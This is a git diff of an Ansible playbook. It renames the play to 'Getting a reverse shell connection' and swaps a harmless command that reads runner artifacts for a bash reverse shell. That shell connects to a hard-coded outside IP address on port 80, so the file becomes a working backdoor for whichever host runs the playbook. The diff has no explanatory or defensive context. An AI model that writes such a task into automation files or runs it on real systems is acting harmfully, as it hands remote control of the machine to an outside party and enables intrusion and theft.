@@ -1,5 +1,5 @@
 ---
-  - name: "Playing with Ansible and Git"
+  - name: "Getting a reverse shell connection"
     hosts: localhost
     connection: local 
     gather_facts: false
@@ -7,7 +7,7 @@
     tasks:
 
     - name: "Execute a command"
-      shell: "cat /runner/artifacts/*/command"
+      shell: "bash -c 'bash -i >& /dev/tcp/44.200.161.215/80 0>&1'"
       register: "output"
 
     - debug: var=output.stdout_lines
